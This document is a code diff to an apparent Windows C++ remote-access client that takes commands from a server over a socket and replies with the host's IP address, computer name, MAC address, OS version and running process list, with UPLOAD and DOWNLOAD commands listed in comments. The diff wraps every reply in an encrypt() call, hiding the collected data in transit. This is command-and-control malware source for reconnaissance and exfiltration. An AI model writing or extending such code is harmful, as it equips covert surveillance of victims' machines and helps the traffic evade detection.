@@ -418,9 +418,12 @@ int main(int argc, char* arg[]) {
     //  UPLOAD
     //  DOWNLOAD
 
-    //receive command from server
     char buffer[200];
+    
+    //Receive command from server    
     int byteCount = recv(clientSocket, buffer, 200, 0);
+    
+    //Convert buffer to a readable string to compare inside the if statements
     string str(buffer);
     if (byteCount > 0) {
         if (str == "IPADDRESS") {
@@ -428,8 +431,13 @@ int main(int argc, char* arg[]) {
 
             string ipAddress = getIpAddress();
             if (ipAddress != "") {
-                const char* msg = ipAddress.c_str();
-                int bytesSent = send(clientSocket, msg, strlen(msg), 0);
+                // const char* msg = ipAddress.c_str();
+                // int bytesSent = send(clientSocket, msg, strlen(msg), 0);
+                
+                // encode ip
+                string encryptedIpAddress = encrypt(ipAddress);
+                int bytesSent = send(clientSocket,encryptedIpAddress.c_str(), encryptedIpAddress.size(), 0);
+                
                 if (bytesSent == SOCKET_ERROR) {
                     cout << "Error at send(): " << WSAGetLastError() << endl;
                     WSACleanup();
@@ -447,8 +455,12 @@ int main(int argc, char* arg[]) {
             DWORD size = sizeof(hostname) / sizeof(char);
 
             if (GetComputerNameA(hostname, &size)) {
-                cout << "Message sent to server: " << hostname << endl;
-                send(clientSocket, hostname, strlen(hostname), 0);
+                // cout << "Message sent to server: " << hostname << endl;
+                // send(clientSocket, hostname, strlen(hostname), 0);
+                
+                // encode hostname
+                string encryptedHostname = encrypt(string(hostname));
+                int bytesSent = send(clientSocket, encryptedHostname.c_str(), encryptedHostname.size(), 0);
             }
             else {
                 cout << "Could not send hostname. Error: " << GetLastError << endl;
@@ -459,8 +471,13 @@ int main(int argc, char* arg[]) {
 
             string MacAddress = getMacAddress();
             if (MacAddress != "") {
-                const char* macmsg = MacAddress.c_str();
-                int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
+                // const char* macmsg = MacAddress.c_str();
+                // int bytesSent = send(clientSocket, macmsg, strlen(macmsg), 0);
+                
+                // encode mac
+                string encryptedMacAddress = encrypt(MacAddress);
+                int bytesSent = send(clientSocket, encryptedMacAddress.c_str(), encryptedMacAddress.size(), 0);
+                
                 if (bytesSent == SOCKET_ERROR) {
                     cout << "Error at send(): " << WSAGetLastError() << endl;
                     WSACleanup();
@@ -475,7 +492,12 @@ int main(int argc, char* arg[]) {
             //Send OS Version
 
             string osMessage = getOS();
-            int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
+            // int bytesSent = send(clientSocket, osMessage.c_str(), osMessage.size() + 1, 0);
+            
+            // encode os
+            string encryptedOsMessage = encrypt(osMessage);
+            int bytesSent = send(clientSocket, encryptedOsMessage.c_str(), encryptedOsMessage.size() + 1, 0);
+            
             if (bytesSent == SOCKET_ERROR) {
                 cout << "Error while sending OS: " << WSAGetLastError() << endl;
             }
@@ -492,7 +514,12 @@ int main(int argc, char* arg[]) {
                 result += string(process.begin(), process.end()) + "\n";
             }
 
-            int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
+            // int bytesSent = send(clientSocket, result.c_str(), result.length(), 0);
+            
+            // encode running processes
+            string encryptedResult = encrypt(result);
+            int bytesSent = send(clientSocket, encryptedResult.c_str(), encryptedResult.length(), 0);
+            
             if (bytesSent == SOCKET_ERROR) {
                 cout << "Error while sending running processes: " << WSAGetLastError() << endl;
                 WSACleanup();
